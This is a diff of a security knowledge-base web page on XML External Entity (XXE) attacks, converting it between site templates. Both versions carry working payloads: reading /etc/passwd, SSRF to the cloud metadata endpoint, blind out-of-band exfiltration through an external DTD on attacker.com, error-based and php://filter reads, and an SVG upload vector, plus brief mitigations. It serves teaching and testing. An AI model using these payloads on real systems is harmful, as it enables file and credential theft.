@@ -1,581 +1,86 @@
-
 <!doctype html>
-<html lang="en" class="no-js">
-  <head>
-    
-      <meta charset="utf-8">
-      <meta name="viewport" content="width=device-width,initial-scale=1">
-      
-      
-      
-        <link rel="canonical" href="https://hansmolemanpng.github.io/kb/web-security/xxe/">
-      
-      
-      
-      
-        
-      
-      
-      <link rel="icon" href="../../../assets/profile.jpeg">
-      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.4">
-    
-    
-      
-        <title>XML External Entity (XXE) - Hans_Moleman.PNG</title>
-      
-    
-    
-      <link rel="stylesheet" href="../../../assets/stylesheets/main.484c7ddc.min.css">
-      
-        
-        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
-      
-      
-
-
-    
-    
-      
-    
-    
-      
-        
-        
-        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
-        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
-      
-    
-    
-      <link rel="stylesheet" href="../../../assets/extra.css">
-    
-    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
-    
-      
-
-    
-    
-  </head>
-  
-  
-    
-    
-      
-    
-    
-    
-    
-    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="orange">
-  
-    
-    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
-    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
-    <label class="md-overlay" for="__drawer"></label>
-    <div data-md-component="skip">
-      
-        
-        <a href="#xml-external-entity-xxe" class="md-skip">
-          Skip to content
-        </a>
-      
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>XML External Entity (XXE) · Hans_Moleman.PNG</title>
+  <link rel="icon" href="../../..assets/profile.jpeg">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,700;1,400&family=Inter:wght@400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+  <link rel="stylesheet" href="../../..assets/style.css">
+</head>
+<body>
+  <nav class="topnav">
+    <a class="topnav-logo" href="/">Hans_Moleman.PNG</a>
+    <div class="topnav-links">
+      <a href="/kb/">KB</a>
+      <a href="/blog/">Blog</a>
+      <a href="/about/">About</a>
     </div>
-    <div data-md-component="announce">
-      
-    </div>
-    
-    
-    <div class="md-container" data-md-component="container">
-      
-      
-      <main class="md-main" data-md-component="main">
-        <div class="md-main__inner md-grid">
-          
-            
-              
-              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
-                <div class="md-sidebar__scrollwrap">
-                  <div class="md-sidebar__inner">
-                    
+  </nav>
 
-
-
-<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
-  <label class="md-nav__title" for="__drawer">
-    <a href="../../.." title="Hans_Moleman.PNG" class="md-nav__button md-logo" aria-label="Hans_Moleman.PNG" data-md-component="logo">
-      
-  <img src="../../../assets/profile.jpeg" alt="logo">
-
-    </a>
-    Hans_Moleman.PNG
-  </label>
-  
-  <ul class="md-nav__list" data-md-scrollfix>
-    
-      
-      
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../.." class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    Home
-  
-
-    
-  </span>
-  
-  
-
-      </a>
-    </li>
-  
-
-    
-      
-      
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../../blog/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    Blog
-  
-
-    
-  </span>
-  
-  
-
-      </a>
-    </li>
-  
-
-    
-      
-      
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    Knowledge Base
-  
-
-    
-  </span>
-  
-  
-
-      </a>
-    </li>
-  
-
-    
-      
-      
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../../about/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    About
-  
-
-    
-  </span>
-  
-  
-
-      </a>
-    </li>
-  
-
-    
-  </ul>
-</nav>
-                  </div>
-                </div>
-              </div>
-            
-            
-              
-              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
-                <div class="md-sidebar__scrollwrap">
-                  <div class="md-sidebar__inner">
-                    
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#basic-file-read" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Basic file read
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#ssrf-via-xxe" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        SSRF via XXE
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#blind-xxe-oob-via-dtd" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Blind XXE — OOB via DTD
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#error-based-xxe" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Error-based XXE
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#php-filter-base64-encode-to-bypass-newline-issues" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        PHP filter — base64 encode to bypass newline issues
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#common-attack-vectors" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Common attack vectors
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#mitigation" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Mitigation
-      
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-                  </div>
-                </div>
-              </div>
-            
-          
-          
-            <div class="md-content" data-md-component="content">
-              
-              <article class="md-content__inner md-typeset">
-                
-
-
-
-
-
-
-
-
-
-
-
-<div class="layout layout--kb">
-
-  <aside class="sidebar sidebar--kb">
-    <div class="sidebar-inner">
-
-      
-      <div class="profile">
-        <a class="avatar-link" href="../../.." aria-label="Home">
-          <img class="avatar" src="../../../assets/profile.jpeg" alt="profile">
-        </a>
-        <div class="name">Hans_Moleman.PNG</div>
-        <div class="bio">AppSec · Web Security · Vulnerability Research</div>
-      </div>
-
-      
-      <div class="social-row">
-        <a class="iconbtn" href="https://x.com/HansMolemanPNG" target="_blank" rel="noopener" aria-label="X">
-          <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M18.9 2H22l-6.8 7.8L23 22h-6.2l-4.9-6.4L6.3 22H3.2l7.3-8.4L1 2h6.3l4.4 5.8L18.9 2zm-1.1 18h1.7L7.4 3.9H5.6L17.8 20z"/></svg>
-        </a>
-        <a class="iconbtn" href="https://github.com/HansMolemanPNG" target="_blank" rel="noopener" aria-label="GitHub">
-          <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0 1 12 6.844a9.59 9.59 0 0 1 2.504.337c1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0 0 22 12.017C22 6.484 17.522 2 12 2z"/></svg>
-        </a>
-        <a class="iconbtn" href="mailto:alsamapa@gmail.com" aria-label="Email">
-          <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20 4H4a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2zm0 4-8 5L4 8V6l8 5 8-5v2z"/></svg>
-        </a>
-      </div>
-
-      <div class="sidebar-divider"></div>
-
-      
-      <div class="navlinks">
-        <div class="navlinks-row">
-          <a class="navbtn" href="../../..">Home</a>
-          <a class="navbtn active"   href="../../">KB</a>
-          <a class="navbtn" href="../../../blog/">Blog</a>
-        </div>
-        <a class="navbtn navbtn--wide" href="../../../about/">About</a>
-      </div>
-
-      
-      
-      <div class="sidebar-divider"></div>
-      <nav class="kb-nav-cards" aria-label="Knowledge Base navigation">
-        
-        
-        <div class="kb-nav-card"
-             style="--cat-color: var(--col-crypto)">
-          <a class="kb-nav-card-hdr" href="../../cryptography/">
-            <span class="kb-nav-card-icon">🔐</span>
-            <span class="kb-nav-card-title">Cryptography</span>
-          </a>
-          
-          <ul class="kb-nav-card-items">
-            
-            
-            <li>
-              <a class="kb-nav-card-item"
-                 href="../../cryptography/jwt/">JSON Web Tokens (JWT)</a>
-            </li>
-            
-          </ul>
-          
-        </div>
-        
-        
-        <div class="kb-nav-card kb-nav-card--active"
-             style="--cat-color: var(--col-web)">
-          <a class="kb-nav-card-hdr" href="../">
-            <span class="kb-nav-card-icon">⚡</span>
-            <span class="kb-nav-card-title">Web Security</span>
-          </a>
-          
-          <ul class="kb-nav-card-items">
-            
-            
-            <li>
-              <a class="kb-nav-card-item"
-                 href="../sqli/">SQL Injection</a>
-            </li>
-            
-            
-            <li>
-              <a class="kb-nav-card-item"
-                 href="../xss/">Cross-Site Scripting (XSS)</a>
-            </li>
-            
-            
-            <li>
-              <a class="kb-nav-card-item kb-nav-card-item--active"
-                 href="./">XML External Entity (XXE)</a>
-            </li>
-            
-          </ul>
-          
-        </div>
-        
-      </nav>
-      
-
-    </div>
-  </aside>
-
-  
-  <main class="main main--article">
-
-    
-    
-    <div class="kb-mobile-menu">
-      <button class="kb-mobile-toggle" aria-expanded="false" aria-label="Toggle KB navigation">
-        <span class="kb-mobile-toggle-chevron">▸</span>
-        <span>KB Navigation</span>
-      </button>
-      <div class="kb-mobile-nav">
-        <nav aria-label="Knowledge Base navigation mobile">
-          
-          
-          <div class="kb-nav-card"
-               style="--cat-color: var(--col-crypto)">
-            <a class="kb-nav-card-hdr" href="../../cryptography/">
-              <span class="kb-nav-card-icon">🔐</span>
-              <span class="kb-nav-card-title">Cryptography</span>
-            </a>
-            
-            <ul class="kb-nav-card-items">
-              
-              
-              <li>
-                <a class="kb-nav-card-item"
-                   href="../../cryptography/jwt/">JSON Web Tokens (JWT)</a>
-              </li>
-              
-            </ul>
-            
-          </div>
-          
-          
-          <div class="kb-nav-card kb-nav-card--active"
-               style="--cat-color: var(--col-web)">
-            <a class="kb-nav-card-hdr" href="../">
-              <span class="kb-nav-card-icon">⚡</span>
-              <span class="kb-nav-card-title">Web Security</span>
-            </a>
-            
-            <ul class="kb-nav-card-items">
-              
-              
-              <li>
-                <a class="kb-nav-card-item"
-                   href="../sqli/">SQL Injection</a>
-              </li>
-              
-              
-              <li>
-                <a class="kb-nav-card-item"
-                   href="../xss/">Cross-Site Scripting (XSS)</a>
-              </li>
-              
-              
-              <li>
-                <a class="kb-nav-card-item kb-nav-card-item--active"
-                   href="./">XML External Entity (XXE)</a>
-              </li>
-              
-            </ul>
-            
-          </div>
-          
-        </nav>
-      </div>
-    </div>
+  <main class="main">
     
 
-    
-    
-      
-        
-          <a class="back-link" href="../">← Web Security</a>
-        
-      
-    
 
-    <h1 id="xml-external-entity-xxe">XML External Entity (XXE)<a class="headerlink" href="#xml-external-entity-xxe" title="Permanent link">&para;</a></h1>
-<h2 id="basic-file-read">Basic file read<a class="headerlink" href="#basic-file-read" title="Permanent link">&para;</a></h2>
-<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
-<span class="cp">&lt;!DOCTYPE foo [</span>
-<span class="cp">  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span>
+
+
+
+
+<article class="article">
+
+  <a class="back-link" href="/kb/web-security/">← Web Security</a>
+
+  <h1 class="article-title">XML External Entity (XXE)</h1>
+
+  
+
+  <div class="article-content">
+    <h1 id="xml-external-entity-xxe">XML External Entity (XXE)</h1>
+<h2 id="basic-file-read">Basic file read</h2>
+<pre class="highlight"><code class="language-xml">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
 ]&gt;
-<span class="nt">&lt;foo&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/foo&gt;</span>
-</code></pre></div>
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></pre>
 <hr />
-<h2 id="ssrf-via-xxe">SSRF via XXE<a class="headerlink" href="#ssrf-via-xxe" title="Permanent link">&para;</a></h2>
-<div class="highlight"><pre><span></span><code><span class="cp">&lt;!DOCTYPE foo [</span>
-<span class="cp">  &lt;!ENTITY xxe SYSTEM &quot;http://169.254.169.254/latest/meta-data/&quot;&gt;</span>
+<h2 id="ssrf-via-xxe">SSRF via XXE</h2>
+<pre class="highlight"><code class="language-xml">&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;
 ]&gt;
-<span class="nt">&lt;foo&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/foo&gt;</span>
-</code></pre></div>
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></pre>
 <hr />
-<h2 id="blind-xxe-oob-via-dtd">Blind XXE — OOB via DTD<a class="headerlink" href="#blind-xxe-oob-via-dtd" title="Permanent link">&para;</a></h2>
+<h2 id="blind-xxe-oob-via-dtd">Blind XXE — OOB via DTD</h2>
 <p>When the response doesn't reflect the entity, use an out-of-band channel.</p>
 <p><strong>External DTD</strong> (hosted on attacker server at <code>http://attacker.com/evil.dtd</code>):</p>
-<div class="highlight"><pre><span></span><code><span class="cp">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span>
-<span class="cp">&lt;!ENTITY % wrap &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://attacker.com/?data=%file;&#39;&gt;</span>&quot;&gt;
+<pre class="highlight"><code class="language-xml">&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY % wrap "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://attacker.com/?data=%file;'&gt;"&gt;
 %wrap;
-%send;
-</code></pre></div>
+%send;</code></pre>
 <p><strong>Payload in the request:</strong></p>
-<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
-<span class="cp">&lt;!DOCTYPE foo [</span>
-<span class="cp">  &lt;!ENTITY % dtd SYSTEM &quot;http://attacker.com/evil.dtd&quot;&gt;</span>
-<span class="w">  </span>%dtd;
+<pre class="highlight"><code class="language-xml">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"&gt;
+  %dtd;
 ]&gt;
-<span class="nt">&lt;foo&gt;</span>x<span class="nt">&lt;/foo&gt;</span>
-</code></pre></div>
+&lt;foo&gt;x&lt;/foo&gt;</code></pre>
 <hr />
-<h2 id="error-based-xxe">Error-based XXE<a class="headerlink" href="#error-based-xxe" title="Permanent link">&para;</a></h2>
+<h2 id="error-based-xxe">Error-based XXE</h2>
 <p>If the app reflects XML parsing errors:</p>
-<div class="highlight"><pre><span></span><code><span class="cp">&lt;!DOCTYPE foo [</span>
-<span class="cp">  &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span>
-<span class="w">  </span><span class="cp">&lt;!ENTITY % wrap &quot;&lt;!ENTITY &amp;#x25; err SYSTEM &#39;file:///nonexistent/%file;&#39;&gt;</span>&quot;&gt;
-<span class="w">  </span>%wrap;
-<span class="w">  </span>%err;
-]&gt;
-</code></pre></div>
+<pre class="highlight"><code class="language-xml">&lt;!DOCTYPE foo [
+  &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+  &lt;!ENTITY % wrap "&lt;!ENTITY &amp;#x25; err SYSTEM 'file:///nonexistent/%file;'&gt;"&gt;
+  %wrap;
+  %err;
+]&gt;</code></pre>
 <p>The file content appears in the error message.</p>
 <hr />
-<h2 id="php-filter-base64-encode-to-bypass-newline-issues">PHP filter — base64 encode to bypass newline issues<a class="headerlink" href="#php-filter-base64-encode-to-bypass-newline-issues" title="Permanent link">&para;</a></h2>
-<div class="highlight"><pre><span></span><code><span class="cp">&lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt;</span>
-</code></pre></div>
+<h2 id="php-filter-base64-encode-to-bypass-newline-issues">PHP filter — base64 encode to bypass newline issues</h2>
+<pre class="highlight"><code class="language-xml">&lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"&gt;</code></pre>
 <hr />
-<h2 id="common-attack-vectors">Common attack vectors<a class="headerlink" href="#common-attack-vectors" title="Permanent link">&para;</a></h2>
+<h2 id="common-attack-vectors">Common attack vectors</h2>
 <table>
 <thead>
 <tr>
@@ -607,52 +112,40 @@
 </tbody>
 </table>
 <p><strong>SVG example:</strong></p>
-<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;</span>
-<span class="cp">&lt;!DOCTYPE svg [</span>
-<span class="cp">  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span>
+<pre class="highlight"><code class="language-xml">&lt;?xml version="1.0" standalone="yes"?&gt;
+&lt;!DOCTYPE svg [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
 ]&gt;
-<span class="nt">&lt;svg</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;http://www.w3.org/2000/svg&quot;</span><span class="nt">&gt;</span>
-<span class="w">  </span><span class="nt">&lt;text&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/text&gt;</span>
-<span class="nt">&lt;/svg&gt;</span>
-</code></pre></div>
+&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
+  &lt;text&gt;&amp;xxe;&lt;/text&gt;
+&lt;/svg&gt;</code></pre>
 <hr />
-<h2 id="mitigation">Mitigation<a class="headerlink" href="#mitigation" title="Permanent link">&para;</a></h2>
+<h2 id="mitigation">Mitigation</h2>
 <ul>
 <li>Disable external entities in the XML parser (default in most modern parsers if configured)</li>
 <li>Use <code>defusedxml</code> in Python, <code>FEATURE_DISALLOW_DOCTYPE_DECL</code> in Java</li>
 <li>Input validation on file uploads (check magic bytes, not just extension)</li>
 </ul>
+  </div>
+
+  
+  <div class="related-posts">
+    <h2 class="related-title">Related posts</h2>
+    
+    <a class="post-row" href="/blog/xxe-deep-dive/">
+      <span class="badge badge--writeup">Writeup</span>
+      <span class="post-row-title">XXE Injection Deep Dive</span>
+      <time class="post-row-date">2026-03-05</time>
+    </a>
+    
+  </div>
+  
+
+</article>
+
   </main>
 
-</div>
-
-
-
-              </article>
-            </div>
-          
-          
-<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
-        </div>
-        
-      </main>
-      
-    </div>
-    <div class="md-dialog" data-md-component="dialog">
-      <div class="md-dialog__inner md-typeset"></div>
-    </div>
-    
-    
-    
-      
-      
-      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": [], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
-    
-    
-      <script src="../../../assets/javascripts/bundle.79ae519e.min.js"></script>
-      
-        <script src="../../../assets/extra.js"></script>
-      
-    
-  </body>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script src="../../..assets/main.js" defer></script>
+</body>
 </html>
